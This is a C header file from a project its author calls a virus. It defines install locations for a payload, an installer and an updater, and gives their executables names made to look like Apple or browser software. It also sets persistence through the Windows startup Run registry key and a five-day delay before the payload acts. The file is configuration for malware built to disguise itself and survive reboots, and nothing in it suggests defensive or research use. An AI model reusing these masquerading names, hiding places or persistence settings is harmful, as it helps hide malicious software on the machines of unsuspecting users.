/***************************************************************************
 *   virusproject.h - Written by samus250, Copyright (C) 2008.             *
 *                                                                         *
 ***************************************************************************/

/*
    Here, you will find many definitions on how the installer and updater operate.
    This does NOT include anything that bacteria.c needs. bacteria.c does not need
    these #define's. This helps us organize things a bit.
    
    Remember, bacteria just needs to know what folder to move and where to move it.
    The installer and updater need to know everything from keys to names to
    install dirs.
*/

//! ENVIRONMENT VARIABLES
#define ENV_SYSTEMROOT "systemroot"
#define ENV_APPDATA "appdata"
#define ENV_USERPROFILE "userprofile"

//! INSTALLATION DIRECTORIES
#define ADMIN_BACTERIA_INSTALL_DIR "system32" // folder in systemroot
#define LIMITED_BACTERIA_INSTALL_DIR "Apple_Updater" // folder in appdata

#define ADMIN_UPDATER_INSTALL_DIR "system32" // folder in systemroot
#define LIMITED_UPDATER_INSTALL_DIR "Apple_Updater" // folder in appdata

//! FILE NAMES: all extensions in .exe please...
#define ADMIN_BACTERIA_NAME "browselb"
#define ADMIN_BACTERIA_FILENAME "browselb.exe"
#define LIMITED_BACTERIA_NAME "iTunesBrowser"
#define LIMITED_BACTERIA_FILENAME "iTunesBrowser.exe"

#define ADMIN_UPDATER_NAME "browserupdate"
#define ADMIN_UPDATER_FILENAME "browserupdate.exe"
#define LIMITED_UPDATER_NAME "iTunesUpdater"
#define LIMITED_UPDATER_FILENAME "iTunesUpdater.exe"

//! KEY NAMES: must be the ones that run at start
#define RUN_KEY_NAME "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define DATE_KEY_NAME "Software\\AppleUpdater"
#define DATE_VALUE_NAME "UpdateCode"

//! DAYS TO TAKE ACTION
#define DELAY_DAYS 5

//! SOME MAXIMUMS
#define MAX_KEY_VALUE_SIZE 2048
#define MAX_ENVVAR_LENGTH 32767
#define MAX_DIR_LENGTH 260





